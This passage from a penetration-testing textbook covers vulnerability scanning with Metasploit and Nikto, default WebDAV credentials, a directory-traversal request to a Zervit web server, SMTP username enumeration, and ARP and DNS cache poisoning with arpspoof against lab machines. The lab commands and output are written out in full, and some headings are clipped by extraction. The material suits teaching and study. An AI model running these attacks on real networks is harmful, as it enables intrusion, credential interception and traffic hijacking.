root@kali:/# ssh 192.168.20.11
The authenticity of host '192.168.20.11 (192.168.20.11)' can't be established.
RSA key fingerprint is ab:d7:b0:df:21:ab:5c:24:8b:92:fe:b2:4f:ef:9c:21.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.20.11' (RSA) to the list of known hosts.
root@192.168.20.11's password: 
Permission denied (publickeyu,password).
Listing 6-6: SSH authentication methods
N ote Some NSE scripts may crash services or harm the target system, and an entire category
is dedicated to denial of service. For example, the script smb-check-vulns will check 
for the MS08-067 vulnerability and other SMB vulnerabilities. Its help information 
notes that this script is likely dangerous and shouldn‚Äôt be run on production systems 
unless you are prepared for the server to go down. 
Metasploit Scanner Modu
Metasploit, which we used in Chapter 4, also can conduct vulnerability 
scanning via numerous auxiliary modules. Unlike exploits, these modules 
will not give us control of the target machine, but they will help us identify 
vulnerabilities for later exploitation.
One such Metasploit module looks for FTP services that provide anonymous access. Although it may be easy enough to attempt to log in manually 
to individual FTP servers, Metasploit auxiliary modules let us scan many 
hosts at once, which will save time when you‚Äôre testing a large environment. 
To choose a particular module, we use the module, then we define 
our targets with set, and then scan with the exploit command, as shown 
in Listing 6-7. This syntax should be familiar from Chapter 4. 
msf > use scanner/ftp/anonymous
msf auxiliary(anonymous) > set RHOSTS 192.168.20.10-11
RHOSTS => 192.168.20.10-11
msf auxiliary(anonymous) > exploit
[*] 192.168.20.10:21 Anonymous READ (220-FileZilla Server version 0.9.32 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de) u
220 Please visit http://sourceforge.net/projects/filezilla/)
Finding Vulnerabilities 147
[*] Scanned 1 of 2 hosts (050% complete)
[*] 192.168.20.11:21 Anonymous READ (220 (vsFTPd 2.3.4)) u
[*] Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(anonymous) > 
Listing 6-7: Metasploit anonymous FTP scanner module
At u, we find that both the Windows XP and Linux targets have anonymous FTP enabled. We know this may or may not be a serious issue, based 
on the files that are available to the anonymous user in the FTP folder. 
I‚Äôve been on engagements where company trade secrets were sitting on an 
Internet-facing FTP server. On the other hand, I‚Äôve also been on engagements where the use of anonymous FTP was justified from a business perspective, and no sensitive files were present. It is up to a pentester to fill in 
the information an automated scanner lacks as to the severity of an issue in 
a particular environment. 
Metasploit Exploit Check Functio
Some Metasploit exploits include a check function that connects to a target 
to see if it is vulnerable, rather than attempting to exploit a vulnerability. 
We can use this command as a kind of ad hoc vulnerability scan, as shown 
in Listing 6-8. (There‚Äôs no need to specify a payload when running check
because no exploitation will take place.)
msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 192.168.20.10
RHOST => 192.168.20.10
msf exploit(ms08_067_netapi) > checku
[*] Verifying vulnerable status... (path: 0x0000005a)
[+] The target is vulnerable.v
msf exploit(ms08_067_netapi) > 
Listing 6-8: MS08-067 check function 
When we run the vulnerability check u, Metasploit tells us that our 
Windows XP target is vulnerable to the MS08-067 vulnerability v, as 
expected. 
Unfortunately, not all Metasploit modules have check functions. (If you 
try running check on a module that doesn‚Äôt support it, Metasploit will tell 
you.) For example, based on the results of our Nmap version scan in the 
previous chapter, the Windows XP target mail server appears to be out of 
date and subject to security issues. SLMail version 5.5.0.4433 has a known 
exploitable issue‚ÄîCVE-2003-0264‚Äîso we can find it easily with a quick 
search in Msfconsole for cve:2003-0264. 
148 Chapter 6
Once in the context of the module, we can test out check, as shown in 
Listing 6-9.
msf exploit(seattlelab_pass) > set RHOST 192.168.20.10
rhost => 192.168.20.10
msf exploit(seattlelab_pass) > check
[*] This exploit does not support check.
msf exploit(seattlelab_pass) >
Listing 6-9: The SLMail module has no check function.
As it turns out, this exploit module does not implement the check function, so we don‚Äôt have solid assurance that a service is vulnerable. Although 
our SLMail POP3 server appears to be vulnerable based on its banner version 
number, we can‚Äôt get confirmation from Metasploit. In cases like these, we 
may not be able to know for sure if a vulnerability exists short of running an 
exploit. 
Web Application Scann
Although a client‚Äôs custom-built apps may have security problems, your target may also deploy prebuilt web applications such as payroll apps, webmail, 
and so on, which can be vulnerable to the same issues. If we can find an 
instance of known vulnerable software, we may be able to exploit it to get 
a foothold in a remote system. 
Web application issues are particularly interesting on many external 
penetration tests where your attack surface may be limited to little more 
than web servers. For example, as you can see in Figure 6-14, browsing to 
the default web page of the web server on our Linux target reveals a default 
Apache install page. 
Figure 6-14: Default Apache page
Finding Vulnerabilities 149
Unless we can find a vulnerability in the underlying web server software, we‚Äôll have a hard time exploiting a simple page that reads ‚ÄúIt works!‚Äù 
Before we write this service off, though, let‚Äôs use a web scanner to look for 
additional pages that we might not see otherwise. 
Nikto 
Nikto is a web application vulnerability scanner built into Kali that‚Äôs like 
Nessus for web apps: It looks for issues such as dangerous files, outdated 
versions, and misconfigurations. To run Nikto against our Linux target, 
we tell it which host to scan with the -h flag, as shown in Listing 6-10.
root@kali:/# nikto -h 192.168.20.11
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP: 192.168.20.11
+ Target Hostname: 192.168.20.11
+ Target Port: 80
+ Start Time: 2015-12-28 21:31:38 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch
--snip--
+ OSVDB-40478: /tikiwiki/tiki-graph_formula.php?w=1&h=1&s=1&min=1&max=2&f[]=x.
tan.phpinfo()&t=png&title=http://cirt.net/rfiinc.txt?: TikiWiki contains a 
vulnerability which allows remote attackers to execute arbitrary PHP code. u
+ 6474 items checked: 2 error(s) and 7 item(s) reported on remote host
+ End Time: 2015-12-28 21:32:41 (GMT-5) (63 seconds)
Listing 6-10: Running Nikto
Manually browsing to the default installation path for every application 
with known vulnerabilities would be a daunting task, but fortunately, Nikto 
seeks out URLs that may not be apparent. One particularly interesting finding here is a vulnerable installation of the TikiWiki software u on the server. 
Sure enough, if we browse to the TikiWiki directory at http://192.168.20.11/
tikiwiki/, we find the CMS software. Nikto thinks that this install is subject 
to a code execution vulnerability, and further analysis of Open Sourced 
Vulnerability Database (OSVDB) entry 40478 reveals that this issue has a 
Metasploit exploit that we can use during exploitation. 
N ote OSVDB (http://osvdb.com/) is a vulnerability repository specifically for open source
software such as TikiWiki, with detailed information on a wide variety of products. 
Use it to search for additional information about possible issues you find.
Attacking XAMPP
Browsing to our Windows XP web server, we see at http://192.168.20.10/ that 
the default web page announces itself as XAMPP 1.7.2. 
By default, XAMPP installations include phpMyAdmin, a database 
administration web application. Ideally, phpMyAdmin would not be available 
150 Chapter 6
over the network, or at least it should require credentials to access it. But 
on this version of XAMPP, the phpMyAdmin install at http://192.168.20.10
/phpmyadmin/ is available and open. Even worse, phpMyAdmin gives us root 
access on the same MySQL server that NSE told us we are unable to connect to. Using phpMyAdmin (as shown in Figure 6-15), we can bypass this 
restriction and perform MySQL queries on the server. 
Figure 6-15: The open phpMyAdmin console complains quite loudly about the poor 
configuration.
Default Credentials
In addition to its inclusion of phpMyAdmin, a Google search tells us 
that XAMPP 1.7.3 and earlier come with Web Distributed Authoring and 
Versioning (WebDAV) software, which is used to manage files on a web 
server over HTTP. XAMPP‚Äôs WebDAV installation comes with the default 
username and password wampp:xampp. If these values aren‚Äôt changed, anyone with access to WebDAV can log in, deface the website, and even possibly upload scripts that will allow attackers to get a foothold on the system 
through the web server. And, as you can see in Figure 6-16, WebDAV is 
indeed present on this server. 
Figure 6-16: WebDAV install
We can use the tool Cadaver to interact with WebDAV servers. In 
Listing 6-11, we use Cadaver to try to connect to the WebDAV server at 
http://192.168.20.10 and test the default credential set.
Finding Vulnerabilities 151
root@kali:/# cadaver http://192.168.20.10/webdav
Authentication required for XAMPP with WebDAV on server `192.168.20.10':
Username: wampp
Password: 
dav:/webdav/> u
Listing 6-11: Using Cadaver
The Cadaver login is successful u. Our Windows XP target uses the 
default credentials for WebDAV, which we will be able to exploit. Now that 
we have access to WebDAV, we can upload files to the web server. 
Manual Analys
Sometimes, no solution will work nearly as well as manual vulnerability 
analysis to see if a service will lead to a compromise, and there‚Äôs no better 
way to improve than practice. In the sections that follow we‚Äôll explore some 
promising leads from our port and vulnerability scanning. 
Exploring a Strange Port
One port that has failed to come up in our automated scans is 3232 on our 
Windows target. If you try scanning this port with an Nmap version scan (as 
we did at the end of Chapter 5), you‚Äôll notice that it crashes. This behavior 
suggests that the listening program is designed to listen for a particular 
input and that it has difficulty processing anything else. 
This sort of behavior is interesting to pentesters, because programs 
that crash when handling malformed input aren‚Äôt validating input properly. 
Recall from Chapter 5 that in the process of crashing the program, the output led us to believe that the software is a web server. Connecting to the port 
with a browser, as shown in Figure 6-17, confirms this.
Figure 6-17: Web server on port 3232
The web page served doesn‚Äôt tell us much, but from here we can connect to the port manually using Netcat. We know this is a web server, so we 
will talk to it as such. We know we can browse to the default web page, so 
we can enter GET / HTTP/1.1 to ask the web server for the default page (see 
Listing 6-12). 
152 Chapter 6
root@kali:~# nc 192.168.20.10 3232
GET / HTTP/1.1
HTTP/1.1 200 OK
Server: Zervit 0.4 u
X-Powered-By: Carbono
Connection: close
Accept-Ranges: bytes
Content-Type: text/html
Content-Length: 36
<html>
<body>
hi
</body>
</html>root@bt:~# 
Listing 6-12: Connecting to a port with Netcat 
The server announces itself as Zervit 0.4 u. It doesn‚Äôt look good for the 
software because the first autocomplete entry in a search for Zervit 0.4 on 
Google is ‚ÄúZervit 0.4 exploit.‚Äù This web server software is subject to multiple security issues, including a buffer overflow and a local file inclusion 
vulnerability, which allows us to serve other files on the system. This service 
is so sensitive that it may be best to avoid buffer overflow attacks, because 
one false move will crash it. The local file inclusion, on the other hand, 
looks promising. We know the server can process HTTP GET requests. For 
example, we can download Windows XP‚Äôs boot.ini file by moving back five 
directories to the C drive using GET, as shown in Listing 6-13. 
root@kali:~# nc 192.168.20.10 3232
GET /../../../../../boot.ini HTTP/1.1 
HTTP/1.1 200 OK
Server: Zervit 0.4
X-Powered-By: Carbono
Connection: close
Accept-Ranges: bytes
Content-Type: application/octet-stream
Content-Length: 211
[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Home 
Edition" /fastdetect /NoExecute=OptIn
Listing 6-13: Local file inclusion in Zervit 0.4 
We‚Äôre able to pull down boot.ini, a config file that tells Windows which 
operating system options to display at boot time. We‚Äôll use this local file 
inclusion to pull down additional sensitive files in Chapter 8.
Finding Vulnerabilities 153
Finding Valid Usernames
We can drastically increase our chances of a successful password attack if 
we know valid usernames for services. (We‚Äôll explore this in more detail in 
Chapter 9.) One way to find valid usernames for mail servers is to use the 
VRFY SMTP command, if it is available. As the name implies, VRFY verifies if a 
user exists. NSE found the VRFY verb is enabled on the Windows XP target in 
the previous chapter. Connect to TCP port 25 using Netcat, and use VRFY to 
check for usernames, as shown in Listing 6-14.
root@kali:~# nc 192.168.20.10 25
220 georgia.com SMTP Server SLmail 5.5.0.4433 Ready ESMTP spoken here
VRFY georgia
250 Georgia<georgia@>
VRFY john
551 User not local
Listing 6-14: Using the SMTP VRFY command 
Using VRFY we see that georgia is a valid username, but there is no user 
called john. We will look at using valid usernames to try to guess passwords 
in Chapter 9. 
Summar
In this chapter, we have touched on various methods to find exploitable vulnerabilities on our targets. Using a variety of tools and techniques, we were 
able to find myriad ways to go after our targets, including our trusty MS08-
067 exploit against our Windows XP SMB server and a local file inclusion 
vulnerability on the Zervit 0.4 web server that will allow us to download 
system files. Using VRFY, we found a valid username that we can use in 
password-guessing attacks on the mail server. 
We learned that the SLMail server may have a vulnerability in the 
POP3 service based on its reported version number (though we were not 
able to find out for sure), and we found an open phpMyAdmin install on 
the web server that gives us root access to the underlying database, as well 
as an XAMPP install with default credentials for WebDAV that will allow 
us to upload files to the web server. On the Linux target, we found an NFS 
share with write access that allows us to write to a user‚Äôs .ssh directory, and 
we discovered a not-readily-apparent TikiWiki install on the web server 
that appears to contain a code execution vulnerability. The Vsftpd 2.3.4 
FTP server may have a hidden backdoor due to a compromise of the Vsftpd 
repositories. 
At this point in the book we can see that our Windows XP and Linux 
target machines suffer from a lot of issues. The lack of attack surface on our 
Windows 7 target makes it seem pretty safe, but as we will see a bit later, that 
solid exterior hides a few holes underneath. Before we move on to exploiting these vulnerabilities, the next chapter will look at capturing traffic to 
gain sensitive information such as login credentials. 

7
C a  turingT raff 
Before we move on to exploitation, we‚Äôll use the 
Wireshark monitoring tool, as well as other tools, to 
sniff and manipulate traffic to gain useful information from other machines on the local network. On 
an internal penetration test, when we‚Äôre simulating an 
insider threat or an attacker who has breached the 
perimeter, capturing traffic from other systems in the network can give 
us additional interesting information (perhaps even usernames and passwords) that can help us with exploitation. The trouble is that capturing 
traffic can produce a massive amount of potentially useful data. Capturing 
all traffic on just your home network could quickly fill several Wireshark 
screens, and discovering which traffic is useful for a pentest can be difficult. 
In this chapter, we‚Äôll look at several ways to manipulate a network to get 
access to traffic we have no business being able to see. 
156 Chapter 7
Networking for Capturing Traffi
If you find yourself in a network that uses hubs rather than switches, capturing traffic not intended for your machine will be easy, because when a 
network hub receives a packet, it rebroadcasts it on all ports, leaving it up 
to each device to decide whom the packet belongs to. In a hubbed network, 
capturing other systems‚Äô traffic is as easy as selecting Use promiscuous mode 
on all interfaces in Wireshark. This tells our Network Interface Controller 
(NIC) to grab everything it sees, which in a hubbed network will be every 
packet. 
Unlike hubs, switches send traffic only to the intended system, so on a 
switched network, we won‚Äôt be able to view, for example, all the traffic to 
and from the domain controller without fooling the network into sending 
us that traffic. Most networks you encounter on pentests will probably be 
switched networks; even some legacy network hardware that claims to be 
a hub may have the functionality of a switch. 
Virtual networks seem to act like hubs, because all your virtual machines 
share one physical device. If you capture traffic in promiscuous mode in 
a virtual network, you may be able to see traffic from every virtual machine 
as well as the host machine, even if you are using a switch instead of a hub in 
your environment. To simulate a non-virtualized network, we‚Äôll turn off Use 
promiscuous mode on all interfaces in Wireshark, which means we will have 
to work a little harder to capture traffic from our target virtual machines. 
Using Wiresha
Wireshark is a graphical network protocol analyzer that lets us take a deep 
dive into the individual packets moving around the network. Wireshark 
can be used to capture Ethernet, wireless, Bluetooth, and many other kinds 
of traffic. It can decode different protocols that it sees, so you could, for 
instance, reconstruct the audio of Voice over IP (VoIP) phone calls. Let‚Äôs 
take a look at the basics of using Wireshark to capture and analyze traffic. 
Capturing Traffic 
Let‚Äôs start by using Wireshark to capture traffic on our local network. 
Start Wireshark in Kali, as shown here. Click through any warnings about 
using Wireshark as root being dangerous.
root@kali:~# wireshark
Tell Wireshark to capture on the local network interface (eth0) by selecting Capture4Options, and selecting the eth0 option, as shown in Figure 7-1. 
Remember to uncheck the Use promiscuous mode on all interfaces option so 
that the results will be like those on a physical switched network rather than 
the VMware network. Exit the Options menu. Finally, click CaptureÔÄ¥Star
to begin the traffic capture. 
Capturing Traffic 157
You should start to see traffic coming in, and you should be able to capture all traffic intended for the Kali machine as well as any broadcast traffic 
(traffic sent to the entire network). 
Figure 7-1: Starting a Wireshark capture 
To illustrate the traffic we can capture in a switched network, let‚Äôs start 
by contacting our Windows XP target from our Kali machine over FTP. 
Log in as anonymous, as shown in Listing 7-1, to see the captured traffic in 
Wireshark. (In the previous chapter, we discovered that the anonymous user 
is allowed on the Windows XP target. Although anonymous requires that you 
enter a password, it doesn‚Äôt matter what it is. Traditionally, it is an email 
address, but the FTP server will accept whatever you would like to use.)
root@kali:~# ftp 192.168.20.10
Connected to 192.168.20.10.
220-FileZilla Server version 0.9.32 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.20.10:root): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> 
Listing 7-1: Logging in via FTP
158 Chapter 7
You should see packets in Wireshark from the system with IP address 
192.168.20.9 to 192.168.20.10 and vice versa, with the Protocol field marked 
as FTP. Wireshark is capturing the traffic moving to and from our Kali 
machine. 
Switch over to your Ubuntu Linux target machine, and log in to the 
FTP server on the Windows XP target. Looking back at Wireshark in Kali, 
you should see that no additional FTP packets have been captured. In our 
simulated switched network, any traffic not destined for our Kali machine 
will not be seen by the network interface and, thus, will not be captured by 
Wireshark. (We‚Äôll learn how to rectify this situation and capture other systems‚Äô traffic in ‚ÄúARP Cache Poisoning‚Äù on page 160.)
Filtering Traffic 
The sheer volume of network traffic captured by Wireshark can be a bit 
overwhelming because, in addition to our FTP traffic, every other packet 
to or from the Kali system is captured. To find specific interesting packets, 
we can use Wireshark filters. The Filter field is located at the top left of 
the Wireshark GUI. As a very simple first Wireshark filtering example, let‚Äôs 
look for all traffic that uses the FTP protocol. Enter ftp in the Filter field 
and click Apply, as shown in Figure 7-2.
Figure 7-2: Filtering traffic in Wireshark 
As expected, Wireshark filters the captured packets to show only those 
that use the FTP protocol. We can see our entire FTP conversation, including our login information, in plaintext. 
Capturing Traffic 159
We can use more advanced filters to further fine-tune the packets 
returned. For example, we can use the filter ip.dst==192.168.20.10 to return 
only packets with the destination IP address 192.168.20.10. We can even 
chain filters together, such as using the filter ip.dst==192.168.20.10 and ftp
to find only FTP traffic destined for 192.168.20.10. 
Following a TCP Stream
Even after filtering traffic, there may be multiple FTP connections captured 
during the same time frame, so it could still be difficult to tell what‚Äôs going 
on. But once we find an interesting packet, such as the beginning of an FTP 
login, we can dig deeper into the conversation by right-clicking the packet 
and selecting Follow TCP Stream, as shown in Figure 7-3. 
Figure 7-3: Following the TCP stream in Wireshark 
The resulting screen will show us the full contents of our FTP connection, including its credentials in plaintext, as shown in Listing 7-2. 
220-FileZilla Server version 0.9.32 beta 
220-written by Tim Kosse (Tim.Kosse@gmx.de) 
220 Please visit http://sourceforge.net/projects/filezilla/ 
USER anonymous 
331 Password required for anonymous 
PASS georgia@bulbsecurity.com 
230 Logged on 
SYST 
215 UNIX emulated by FileZilla
Listing 7-2: FTP login conversation 
160 Chapter 7
Dissecting Packets 
By selecting a specific captured packet, we can get more information about 
the captured data, as shown in Figure 7-4. At the bottom of the Wireshark 
screen, you can see details of the selected packet. With a little guidance, 
Wireshark will break down the data for you. For example, we can easily 
find the TCP destination port by selecting the TCP entry and looking for 
Destination port, as highlighted in the figure. When we select this field, 
the entry in the raw bytes of the packet is highlighted as well. 
Figure 7-4: Packet details in Wireshark
ARP Cache Poisoni
While it is nice to see the details of our own traffic, for pentesting purposes, 
it would be preferable to see the traffic that wasn‚Äôt intended for our Kali 
system. Perhaps we‚Äôll be able to capture another user‚Äôs login session that 
uses an account other than anonymous to log in; that would give us working 
credentials for the FTP server, as well as a set of credentials that might be 
reused elsewhere in the environment. 
To capture traffic not intended for the Kali system, we need to find 
some way to have the relevant data sent to our Kali system. Because the 
network switch will send only packets that belong to us, we need to trick 
our target machine or the switch (or ideally both) into believing the traffic 
belongs to us. We will perform a so-called man-in-the-middle attack, which 
Capturing Traffic 161
will allow us to redirect and intercept traffic between two systems (other 
than our own system) before forwarding packets on to the correct destination. One tried-and-true technique for masquerading as another device on 
the network is called Address Resolution Protocol (ARP) cache poisoning (also 
known as ARP spoofing). 
ARP Basics 
When we connect to another machine on our local network, we usually 
use its hostname, fully qualified domain name, or IP address. (We‚Äôll look 
at domain name server cache poisoning in ‚ÄúDNS Cache Poisoning‚Äù on 
page 167.) Before a packet can be sent from our Kali machine to the 
Windows XP target, Kali must map the IP address of the XP target machine 
to the Media Access Control (MAC) address of the network interface card 
(NIC) so Kali knows where on the network to send the packet. To do this, 
it uses ARP to broadcast ‚ÄúWho has IP address 192.168.20.10?‚Äù on the local 
network. The machine with the IP address 192.168.20.10 writes back, ‚ÄúI have 
192.168.20.10, and my MAC address is 00:0c:29:a9:ce:92.‚Äù In our case this 
will be the Windows XP target. Our Kali system will store the mapping from 
IP address 192.168.20.10 to the MAC address 00:0c:29:a9:ce:92 in its ARP 
cache.
When it sends the next packet, our machine will first look to its ARP 
cache for an entry for 192.168.20.10. If it finds one, it will use that entry 
as the address of the target rather than sending another ARP broadcast. 
(ARP cache entries are flushed out regularly because network topology may 
change at any time.) Thus, systems will regularly be sending ARP broadcasts as their caches are flushed. This process will come in handy when we 
perform ARP cache poisoning in the next section. The ARP process is illustrated in Figure 7-5.
Ubuntu target
(192.168.20.11)
Windows XP target
(192.168.20.10)
Kali
(192.168.20.9)
Who has 192.168.20.10? Who has 192.168.20.10?
I have 192.168.20.10.
My MAC address is 
00:0c:29:a9:ce:92.
Figure 7-5: ARP resolution process 
162 Chapter 7
To view the ARP cache in our Kali machine, enter arp. Currently, the 
only IP address‚Äìto‚ÄìMAC address mappings that it knows are 192.168.20.1, 
the default gateway, as well as 192.168.20.10, the Windows XP machine we 
engaged in the last exercise.
root@kali:~# arp
Address HWtype HWaddress Flags Mask Iface
192.168.20.1 ether 00:23:69:f5:b4:29 C eth0
192.168.20.10 ether 00:0c:29:05:26:4c C eth0
Now restart the Wireshark capture, and use the anonymous login to 
interact with the Ubuntu target‚Äôs FTP server again. Next, use the arp
filter, as shown in Figure 7-6, to see the ARP broadcast from the Kali 
machine and the reply from the Ubuntu target with its MAC address. 
Figure 7-6: ARP broadcast and reply
Check your Kali Linux‚Äôs ARP cache again. You should see an entry for 
192.168.20.10. 
root@kali:~# arp
Address HWtype HWaddress Flags Mask Iface
192.168.20.1 ether 00:23:69:f5:b4:29 C eth0
192.168.20.10 ether 00:0c:29:05:26:4c C eth0
192.168.20.11 ether 80:49:71:14:97:2b C eth0
The trouble with relying on ARP for addressing is that there‚Äôs no guarantee that the IP address‚Äìto‚ÄìMAC address answer you get is correct. Any 
machine can reply to an ARP request for 192.168.20.11, even if that machine 
is really at 192.168.20.12 or some other IP address. The target machine will 
accept the reply, regardless. 
Capturing Traffic 163
That‚Äôs ARP cache poisoning in a nutshell. We send out a series of ARP 
replies that tell our target that we are another machine on the network. 
Thus, when the target sends traffic intended for that machine, it will instead 
send the packets straight to us to be picked up by our traffic sniffer, as shown 
in Figure 7-7. 
Recall from ‚ÄúCapturing Traffic‚Äù on page 156 that we initiated an FTP 
connection from our Ubuntu target to the Windows XP target, but the traffic flowing through that connection was not captured by Wireshark on our 
Kali system. Using an ARP cache poisoning attack, we can trick the two 
systems into sending their traffic to our Kali machine instead, to be captured in Wireshark. 
Ubuntu target
(192.168.20.11)
Windows XP target
(192.168.20.10)
Kali
(192.168.20.9)
Ubuntu sends traffic destined
for Windows XP to Kali.
Windows XP sends traffic
destined for Ubuntu to Kali.
Kali forwards 
traffic to Ubuntu.
Kali forwards traffic
to Windows XP.
Figure 7-7: ARP cache poisoning redirects traffic through Kali. 
IP Forwarding
But before we can trick the Linux target into sending credentials for the 
FTP server to us instead, we need to turn on IP forwarding to tell our Kali 
machine to forward any extraneous packets it receives to their proper destination. Without IP forwarding, we‚Äôll create a denial-of-service (DoS) condition 
on our network, where legitimate clients are unable to access services. For 
example, if we were to use ARP cache poisoning without IP forwarding to 
redirect traffic from the Linux target, intended for the Windows XP target, 
to our Kali machine, the FTP server on the Windows XP machine would 
never receive the packets from the Linux machine and vice versa. 
The setting for IP forwarding on Kali is in /proc/sys/net/ipv4/ip_forward. 
We need to set this value to 1.
root@kali:~# echo 1 > /proc/sys/net/ipv4/ip_forward
164 Chapter 7
Before we start ARP cache poisoning, note the entry for the Windows 
XP target (192.168.20.10) in the Linux target‚Äôs ARP cache. This value will 
change to the MAC address of the Kali machine after we commence ARP 
cache poisoning. 
georgia@ubuntu:~$ arp -a
? (192.168.20.1) at 00:23:69:f5:b4:29 [ether] on eth2
? (192.168.20.10) at 00:0c:29:05:26:4c [ether] on eth0
? (192.168.20.9) at 70:56.81:b2:f0:53 [ether] on eth2
ARP Cache Poisoning with Arpspoof
One easy-to-use tool for ARP cache poisoning is Arpspoof. To use Arpspoof, 
we tell it which network interface to use, the target of our ARP cache poisoning attack, and the IP address we would like to masquerade as. (If you 
leave out the target, you‚Äôll poison the entire network.) For our example, to 
fool the Linux target into thinking we are the Windows XP machine, I set 
the -i option as eth0 to specify the interface, the -t option as 192.168.20.11 
to specify the target as the Linux box, and 192.168.20.10 as the Windows XP 
machine I want to pretend to be. 
root@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.10
Arpspoof immediately starts sending ARP replies to the Linux target, 
informing it that the Windows XP machine is located at the Kali machine‚Äôs 
MAC address. (ARP cache entries are updated at varying times among different implementations, but one minute is a safe length of time to wait.) 
To capture the other side of the conversation, we need to fool the 
Windows XP machine into sending traffic intended for the Linux target to 
the Kali machine as well. Start another instance of Arpspoof, and this time 
set the target as the Windows XP machine and the recipient as the Linux 
machine.
root@kali:~# arpspoof -i eth0 -t 192.168.20.10 192.168.20.11
Once you start ARP cache poisoning, check your Linux target‚Äôs ARP 
cache again. Notice that the MAC address associated with the Windows XP 
target has changed to 70:56:81:b2:f0:53. The Linux target should send all 
traffic intended for the Windows XP target to the Kali machine, where we 
can capture it in Wireshark. 
georgia@ubuntu:~$ arp -a
? (192.168.20.1) at 00:23:69:f5:b4:29 [ether] on eth0
? (192.168.20.10) at 70:56:81:b2:f0:53 [ether] on eth0
Capturing Traffic 165
Now log in to the Windows XP target‚Äôs FTP server from the Linux target 
using another account (see Listing 7-3). (The credentials georgia:password
will work if you followed my instructions in Chapter 1. If you set your credentials as something else, use those instead.)
georgia@ubuntu:~$ ftp 192.168.20.10
Connected to 192.168.20.10.
220-FileZilla Server version 0.9.32 beta
220-written by Tim Kosse (Tim.Kosse@gmx.de)
220 Please visit http://sourceforge.net/projects/filezilla/
Name (192.168.20.10:georgia): georgia
331 Password required for georgia
Password:
230 Logged on
Remote system type is UNIX.
Listing 7-3: Logging in to FTP on Windows XP from the Ubuntu target with a user account
Because we have IP forwarding turned on, everything appears to work 
normally as far as our user is concerned. Returning to Wireshark, we see 
that this time we were able to capture the FTP traffic and read the plaintext 
login credentials. The Wireshark output shown in Figure 7-8 confirms that 
our Kali machine is forwarding the FTP traffic between the two targets. 
After each FTP packet, there is a retransmission packet.
Figure 7-8: Wireshark captures the login information.
Using ARP Cache Poisoning to Impersonate the Default Gateway
We can also use ARP cache poisoning to impersonate the default gateway 
on a network and access traffic entering and leaving the network, including traffic destined for the Internet. Stop the Arpspoof processes you have 
166 Chapter 7
running, and try tricking the Linux target into routing all traffic to the 
gateway through the Kali machine by impersonating the default gateway, 
as shown here.
root@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.1
root@kali:~# arpspoof -i eth0 -t 192.168.20.1 192.168.20.11
If we start to browse the Internet from the Linux target, we should see 
HTTP packets being captured by Wireshark. Even if sensitive information is 
encrypted with HTTPS, we‚Äôll still be able to see where users are going and 
any other information sent over HTTP. For example, if we run a Google 
query, the plaintext of the query will be captured in Wireshark, as shown in 
Figure 7-9. 
N ote If you use ARP cache poisoning to trick a large network into thinking your pentest
machine is the default gateway, you may unwittingly cause networking issues. All the 
traffic in a network going through one laptop (or worse, one virtual machine) can 
slow things down to the point of denial of service in some cases. 
Figure 7-9: Query captured in Wireshark
Capturing Traffic 167
DNS Cache Poison
In addition to ARP cache poisoning, we can also poison Domain Name 
Service (DNS) cache entries (mappings from domain names to IP addresses) 
to route traffic intended for another website to one we control. Just as ARP 
resolves IP to MAC addresses to properly route traffic, DNS maps (or 
resolves) domain names such as www.gmail.com to IP addresses. 
To reach another system on the Internet or local network, our machine 
needs to know the IP address to connect to. It is easy to remember the URL 
www.gmail.com if we want to visit our web mail account, but it‚Äôs difficult to 
remember a bunch of IP addresses, which may even change regularly. DNS 
resolution translates the human-readable domain name into an IP address. 
For example, we can use the tool Nslookup to translate www.gmail.com into an 
IP address, as shown in Listing 7-4. 
root@kali~# nslookup www.gmail.com
Server: 75.75.75.75
Address: 75.75.75.75#53
Non-authoritative answer:
www.gmail.com canonical name = mail.google.com.
mail.google.com canonical name = googlemail.l.google.com.
Name: googlemail.l.google.com
Address: 173.194.37.85
Name: googlemail.l.google.com
Address: 173.194.37.86
Listing 7-4: Nslookup DNS resolution 
As you can see, Nslookup translates www.gmail.com to a number of IP 
addresses, including 173.194.37.85 and 173.194.37.86, all of which we can 
use to reach Gmail. To perform DNS resolution (Figure 7-10), our system 
queries its local DNS server for information about a specific domain name, 
such as www.gmail.com. If the DNS server has a cache entry for the address, 
it gives our system the correct IP address. If not, it contacts other DNS servers on the Internet looking for the correct information. 
When the correct IP address is returned, the DNS server writes back 
to our machine with the correct IP address resolution for www.gmail.com, 
and our system then translates www.gmail.com into 173.194.37.85, as shown 
in Listing 7-4. Users can then access www.gmail.com by name without having 
to use the IP address.
168 Chapter 7
DNS server www.gmail.com
Kali local DNS server
I want to browse to
www.gmail.com. 
What‚Äôs the IP address?
www.gmail.com
is at 173.194.37.85.
Browse to
173.194.37.85.
www.gmail.com
is at 173.194.37.85.
Internet
I don‚Äôt know
www.gmail.com.
I‚Äôll ask another
DNS server.
Figure 7-10: DNS resolution 
Getting Started
DNS cache poisoning works like ARP cache poisoning: We send a bunch 
of bogus DNS resolution replies pointing to the wrong IP address for a 
domain name. 
Now make sure the Apache server is running with the command service 
apache2 start. 
root@kali:~# service apache2 start
 * Starting web server apache2 [ OK ] 
Before we use a DNS cache poisoning tool, we need to create a file that 
specifies which DNS names we would like to spoof and where to send traffic. 
For example, let‚Äôs tell any system that runs a DNS resolution for www.gmail
.com that that domain‚Äôs IP address is our Kali machine by adding the entry 
Capturing Traffic 169
192.168.20.9 www.gmail.com to a new file called hosts.txt. (You can name the 
file anything you like.)
root@kali:~# cat hosts.txt 
192.168.20.9 www.gmail.com
Using Dnsspoof
Restart Arpspoof between the Linux target and the default gateway and 
vice versa as discussed in ‚ÄúUsing ARP Cache Poisoning to Impersonate the 
